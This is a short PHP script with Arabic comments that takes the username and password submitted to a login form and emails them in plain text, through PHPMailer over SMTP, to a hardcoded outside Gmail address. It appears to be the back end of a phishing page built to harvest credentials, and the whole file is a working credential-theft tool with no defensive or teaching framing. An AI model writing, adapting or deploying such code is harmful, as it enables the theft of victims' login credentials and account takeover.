<?php
// تضمين مكتبة PHPMailer
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php'; // المسار إلى autoload.php من Composer

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // البيانات من النموذج
    $username = $_POST['username'];
    $password = $_POST['password'];

    // إنشاء كائن PHPMailer
    $mail = new PHPMailer(true);

    try {
        // إعدادات SMTP
        $mail->isSMTP(); // استخدام SMTP
        $mail->Host       = 'smtp.example.com'; // خادم SMTP الخاص بك
        $mail->SMTPAuth   = true; // تفعيل المصادقة SMTP
        $mail->Username   = 'your-email@example.com'; // بريدك الإلكتروني
        $mail->Password   = 'your-email-password'; // كلمة مرور البريد الإلكتروني
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS; // تشفير STARTTLS
        $mail->Port       = 587; // منفذ SMTP

        // إعدادات الرسالة
        $mail->setFrom('your-email@example.com', 'Your Name');
        $mail->addAddress('nakamotoishihara001@gmail.com'); // البريد الإلكتروني الوجهة

        // محتوى الرسالة
        $mail->isHTML(true); // استخدام HTML في الرسالة
        $mail->Subject = 'تسجيل الدخول';
        $mail->Body    = "<p>اسم المستخدم: $username</p><p>كلمة المرور: $password</p>";

        $mail->send();
        echo 'تم إرسال الرسالة بنجاح';
    } catch (Exception $e) {
        echo "فشل إرسال الرسالة: {$mail->ErrorInfo}";
    }
}
?>
